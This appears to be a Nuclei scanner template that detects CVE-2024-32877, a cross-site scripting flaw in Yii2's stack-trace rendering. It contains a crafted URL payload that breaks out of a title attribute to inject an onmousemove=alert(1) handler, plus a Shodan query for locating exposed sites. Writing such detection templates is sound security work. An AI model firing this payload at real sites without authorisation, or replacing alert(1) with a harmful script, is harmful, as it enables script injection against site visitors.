id: CVE-2024-32877

info:
  name: Yii2 2.0.49.3 - Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  description: |
    Yii 2 is a PHP application framework. During internal penetration testing of a product based on Yii2, users discovered a Cross-site Scripting (XSS) vulnerability within the framework itself. This issue is relevant for the latest version of Yii2 (2.0.49.3). This issue lies in the mechanism for displaying function argument values in the stack trace. The vulnerability manifests when an argument's value exceeds 32 characters. For convenience, argument values exceeding this limit are truncated and displayed with an added "...". The full argument value becomes visible when hovering over it with the mouse, as it is displayed in the title attribute of a span tag. However, the use of a double quote (") allows an attacker to break out of the title attribute's value context and inject their own attributes into the span tag, including malicious JavaScript code through event handlers such as onmousemove. This vulnerability allows an attacker to execute arbitrary JavaScript code in the security context of the victim's site via a specially crafted link.
  reference:
    - https://github.com/yiisoft/yii2/security/advisories/GHSA-qg5r-95m4-mjgj
    - https://nvd.nist.gov/vuln/detail/CVE-2024-32877
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"Yii Framework"
  tags: cve,cve2024,yiisoft,yii2,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}/about/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%22%20onmousemove=alert(1)%20style=%22width:%20100000px;%20height:%20100000px;%20position:%20absolute;%20top:%20-10000px;%20left:%200;%22"
      - "{{BaseURL}}/site/about/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%22%20onmousemove=alert(1)%20style=%22width:%20100000px;%20height:%20100000px;%20position:%20absolute;%20top:%20-10000px;%20left:%200;%22"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'onmousemove=alert(1)'
          - 'Yii'
        condition: and
        case-insensitive: true

      - type: word
        part: header
        words:
          - "text/html"
